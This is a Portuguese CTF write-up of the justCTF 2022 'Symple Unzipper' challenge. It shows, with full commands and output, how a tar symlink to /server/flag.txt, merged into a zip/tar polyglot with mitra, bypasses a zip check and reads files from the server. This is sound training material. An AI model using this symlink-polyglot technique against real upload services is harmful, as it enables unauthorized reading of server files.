# justCTF 2022 write-up - Symple Unzipper

![Banner](https://i.imgur.com/PQkhOVR.png)

O justCTF foi organizado pelo time just **C**at **T**he **F**ish e inclui as categorias mais comuns de desafios, incluindo alguns ótimos web.
Fiquei meio triste que ele rodou junto com o WeCTF, que também é excelente :)

O desafio está disponível no meu repositório pra você testar localmente.

## O Desafio

Você tem acesso a uma aplicação web em que você pode fazer POST de um arquivo zip para a rota `/extract` e recebe um JSON como resultado, com o conteúdo do zip descompactado.

O objetivo é acessar o arquivo `flag.txt`, que fica no mesmo diretório da aplicação.

Esse desafio foi bastante "didático" nas dicas, o que deixou ele bem mais fácil, mas trouxe um aprendizado interessante pra mesa e já valeu a pena.
Ainda assim, acho que ele seria mais interessante com algumas dicas a menos, porque o conceito dele foi bem legal.

A ordem do write-up está mais focada em mostrar a linha de raciocínio para a solução.

Fiz umas mudanças pequenas pro setup ficar mais simples, porque o original faz uma montagem do flag em um diretório que você não vai ter localmente.

O original está em original-server.tar.gz.

## Tela inicial

![Symple Unzipper Challenge](https://i.imgur.com/d3eSNlQ.png)

## Interação

Vamos gerar um arquivo zip simples para testes:

```bash
echo a > a.txt

zip a.zip a.txt
  adding: a.txt (stored 0%)
  
unzip -l a.zip

Archive:  a.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        2  2022-06-13 08:46   a.txt
---------                     -------
        2                     1 file
```

Simulando a chamada:

```bash
curl -X 'POST' \
>   'http://symple-unzipper.web.jctf.pro/extract' \
>   -H 'accept: application/json' \
>   -H 'Content-Type: multipart/form-data' \
>   -F 'file=@a.zip;type=application/zip'

{"a.txt":"a\n"}
```

Ele basicamente gera um dicionário com o nome do arquivo e o conteúdo de cada um.

## Zip Symlink

Esse desafio me lembrou de um desafio bem interessante do DefenitCTF 2020:
https://neptunian.medium.com/defenit-ctf-2020-write-up-tar-analyzer-web-hacking-29ed5be3f5f4

Lá eu pude usar uma técnica de [Zip Symlink](https://book.hacktricks.xyz/pentesting-web/file-upload#symlink), onde você manda um link simbólico dentro do um arquivo zip, que aponta para algum arquivo qualquer no servidor. Com isso, você consegue um [LFI (Local File Inclusion)](https://book.hacktricks.xyz/pentesting-web/file-inclusion).

Essa técnica não teve sucesso, porque a biblioteca que faz a descompressão do zip neste caso não gera um symlink, mas gera um arquivo texto com o caminho do link simbólico... o que não resolve o nosso problema :)

Mas não desista de mim ainda!

## Simulando Localmente

O código-fonte foi disponibilizado e você consegue rodar mandando um `docker-compose up` no diretório do `docker-compose.yml`.

```
$ docker-compose up

Creating server_server_1 ... done
Attaching to server_server_1
server_1  | INFO:     Started server process [1]
server_1  | INFO:     Waiting for application startup.
server_1  | INFO:     Application startup complete.
server_1  | INFO:     Uvicorn running on http://0.0.0.0:80 (Press CTRL+C to quit)
```

Vamos rodar o mesmo teste localmente pra ver o comportamento da app.

```bash
curl -X 'POST' \
>   'http://localhost/extract' \
>   -H 'accept: application/json' \
>   -H 'Content-Type: multipart/form-data' \
>   -F 'file=@a.zip;type=application/zip'

{"a.txt":"a\n"}
```

E a saída do server:

```
server_1  | patool: Extracting /server/uploads/tmpck5kvsm5/a.zip ...
server_1  | patool: ... /server/uploads/tmpck5kvsm5/a.zip extracted to `/server/uploads/tmpck5kvsm5/tmpub35qhl_'.
server_1  | INFO:     172.30.0.1:50086 - "POST /extract HTTP/1.1" 200 OK
```

Vamos entender esse `patool` aí.

## Processo de Descompressão

Vamos começar analisando o código do `server.py`.

A descompressão é feita com a biblioteca python [`patool`](https://pypi.org/project/patool/):

```python
# ...
from zipfile import is_zipfile
# ...
from patoolib import extract_archive.
# ...

if not is_zipfile(file_to_extract):
    raise HTTPException(status_code=415, detail=f"The input file must be an ZIP archive.")
    
with TemporaryDirectory(dir=tmpdir) as extract_to_dir:
    try:
        extract_archive(str(file_to_extract), outdir=extract_to_dir)
    except PatoolError as e:
        raise HTTPException(status_code=400, detail=f"Error extracting ZIP {file_to_extract.name}: {e!s}")
    
    return read_files(extract_to_dir)
# ...
```

### Resumo
* Ele analisa a assinatura do arquivo através da função `zipfile.is_zipfile`.
    * Verifiquei e se trata de uma validação mais complexa, não olhando apenas pros primeiros bytes do arquivo.
    * Ele ignora a extensão do arquivo na validação.
* Cria um diretório temporário.
* Extrai o arquivo zip pra dentro do diretório, usando a função `patoolib.extract_archive`.

Vamos simular a descompressão localmente:

```python
Python 3.8.10 (default, Sep 28 2021, 16:10:42) 
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from patoolib import extract_archive
>>> file_to_extract = 'a.zip'
>>> extract_to_dir = './tmp'
>>> extract_archive(str(file_to_extract), outdir=extract_to_dir)
patool: Extracting a.zip ...
patool: running /usr/bin/7z x -o./tmp -- a.zip
patool: ... a.zip extracted to `./tmp'.
'./tmp'
>>> quit()
```

Eu queria chamar a atenção para a chamada do comando `7z`:
```bash
/usr/bin/7z x -o./tmp -- a.zip
```

O patool basicamente usa a linha de comando pra chamar o [`7z`](https://linux.die.net/man/1/7z).

## Onde a falha deve TAR?

Tem duas pistas importantes no próprio código-fonte, mas vamos começar com uma delas:

```python
# make sure the file is a valid zip because Python's zipfile doesn't support symlinks (no hacking!)
if not is_zipfile(file_to_extract):
    raise HTTPException(status_code=415, detail=f"The input file must be an ZIP archive.")
```

Ele já explica que o zip não suporta os symlinks, mas e o TAR? Vamos comentar essa validação acima e reiniciar o container pra tesTAR com o Symlink (modo tiozão ativado).

```bash
$ echo "arquivo_local" > flag.txt

$ cat flag.txt 
arquivo_local

$ ln -s flag.txt flag.lnk

$ ls -l flag.lnk
lrwxrwxrwx 1 neptunian neptunian 8 jun 13 21:28 flag.lnk -> flag.txt

$ tar cvf give_me_flag.tar flag.lnk
flag.lnk

$ curl -X 'POST' \
>   'http://localhost/extract' \
>   -H 'accept: application/json' \
>   -H 'Content-Type: multipart/form-data' \
>   -F 'file=@give_me_flag.tar;type=application/tar'

{"detail":"Error extracting ZIP give_me_flag.tar: Command `['/bin/tar', '--extract', '--file', '/server/uploads/tmp68au0463/give_me_flag.tar', '--directory', '/server/uploads/tmp68au0463/tmpmf782p_m']' returned non-zero exit status 2"}
```

ERRO! mas o container tem mais informações:

```
server_1  | /bin/tar: flag.lnk: Cannot change ownership to uid 1002, gid 1003: Operation not permitted
server_1  | /bin/tar: Exiting with failure status due to previous errors
```

Ele até tentou extrair, mas teve problema de ownership. O server (no caso, o container) não conhece o uid/gid do meu usuário local:

```bash
$ id
uid=1002(neptunian) gid=1003(neptunian) ...
```

Como ele roda como root, vamos forçar o uid/gid do troço. 
Lembrei também que o arquivo vai ser extraído em um diretório temporário, então vamos criar o symlink apontando pro path absoluto no servidor.

```bash
$ rm flag.lnk 
 
$ ln -s /server/flag.txt flag.lnk
 
$ rm give_me_flag.tar 

$ tar --owner=root --group=root --create --file give_me_flag.tar flag.lnk
```

Bora pro round 2:

```bash
$ curl -X 'POST' \
>   'http://localhost/extract' \
>   -H 'accept: application/json' \
>   -H 'Content-Type: multipart/form-data' \
>   -F 'file=@give_me_flag.tar;type=application/tar'

{"flag.lnk":"ctf{fake_flag}\n"}
```

Meio Sucesso!

![](https://i.imgur.com/Sz7xi3E.png)


Se conseguirmos mandar um TAR, conseguimos pegar a flag via Symlink/LFI, mas... ele só permite arquivos ZIP, não TAR.

## Poliglotas!

![](https://i.imgur.com/An23FIu.jpg)

O código-fonte do index.html esfrega a segunda dica na nossa cara:

```html
<p>
    Solving the challenge does not involve denial of service or things like ZIP bombs. Please don't do that.
    HINT: There is a special type of file you will need to craft.
    <!-- SUPER SECRET HINT #2: check out https://github.com/corkami/mitra -->
</p>
```

`
**[Mitra](https://github.com/corkami/mitra)**

A tool to generate binary polyglots (files that are valid with several file formats).`

Esse conceito do "arquivo poliglota" é bem interessante: basicamente arquivos que funcionam como dois ou mais formatos.

Basicamente passamos como parâmetros dois arquivos de formatos diferentes e ele tenta combiná-los, de forma que essa combinação passe a funcionar nos dois cenários (ex: PDF que também é uma imagem PNG).

Vamos tentar combinar os nossos arquivos ZIP e TAR:

```
$ python /opt/tools/mitra/mitra.py give_me_flag.tar a.zip
give_me_flag.tar
File 1: TAR / Tape Archive
a.zip
File 2: Zip

Stack: concatenation of File1 (type TAR) and File2 (type Zip)
Parasite: hosting of File2 (type Zip) in File1 (type TAR)
```

Isso gera dois arquivos com nomes bizarros, mas o que interessa é o Stack, que começa com "S".

```
$ ls S* P*
'P(200-400)-TAR[Zip].b85e2944.tar.zip'  'S(2800)-TAR-Zip.cc1382b4.zip.tar'
$ mv S\(2800\)-TAR-Zip.cc1382b4.zip.tar hackit.tar
```

Mas pra saber se é verdade, precisamos testar o arquivo como TAR e como ZIP.

```
$ tar tvf hackit.tar
lrwxrwxrwx root/root         0 2022-06-13 21:42 flag.lnk -> /server/flag.txt

$ unzip -l hackit.tar
Archive:  hackit.tar
warning [hackit.tar]:  10240 extra bytes at beginning or within zipfile
  (attempting to process anyway)
  Length      Date    Time    Name
---------  ---------- -----   ----
        2  2022-06-13 08:46   a.txt
---------                     -------
        2                     1 file
```

Bonito!
Temos um arquivo TAR, que também é um ZIP :)

## Hack It!

Resumo até aqui:
- A aplicação valida que o arquivo é ZIP, mas não valida a extensão.
- Criamos um TAR que é um Symlink para o caminho da Flag.
- A ferramenta de extração no servidor chama uma linha de comando do 7z, que usa a extensão do arquivo pra descompactar. 
- Criamos um arquivo que é ZIP e TAR ao mesmo tempo, com a ferramenta mitra (dica do autor).

Com isso, vamos enganar a validação do zip e, mesmo assim, permitir que a extração seja do próprio arquivo TAR, devido à extensão (.tar).

Chega de teste local, bora pro server:

```bash
 curl -X 'POST' \
>   'http://symple-unzipper.web.jctf.pro/extract' \
>   -H 'accept: application/json' \
>   -H 'Content-Type: multipart/form-data' \
>   -F 'file=@hackit.tar;type=application/tar'

{"flag.lnk":"justCTF{siymmple_challll_bay_sultanik_o/}"}
```

Flag na mão!

```
justCTF{siymmple_challll_bay_sultanik_o/}
```

## Referências
* [CTF Time Event](https://ctftime.org/event/1631)
* [justCTF](https://2022.justctf.team/)
* [Defenit CTF 2020 — Write-Up — Tar Analyzer (Web Hacking)](https://neptunian.medium.com/defenit-ctf-2020-write-up-tar-analyzer-web-hacking-29ed5be3f5f4)
* [Zip Symlink](https://book.hacktricks.xyz/pentesting-web/file-upload#symlink)
* [LFI (Local File Inclusion)](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
* [patool](https://pypi.org/project/patool/)
* [7z(1) - Linux man page](https://linux.die.net/man/1/7z)
* [Mitra](https://github.com/corkami/mitra)
* [Github repo with the artifacts discussed here](https://github.com/Neptunians/tsj-2022-writeups)
* Team: [FireShell](https://fireshellsecurity.team/)
* Team Twitter: [@fireshellst](https://twitter.com/fireshellst)
* Follow me too :) [@NeptunianHacks](https://twitter.com/NeptunianHacks) 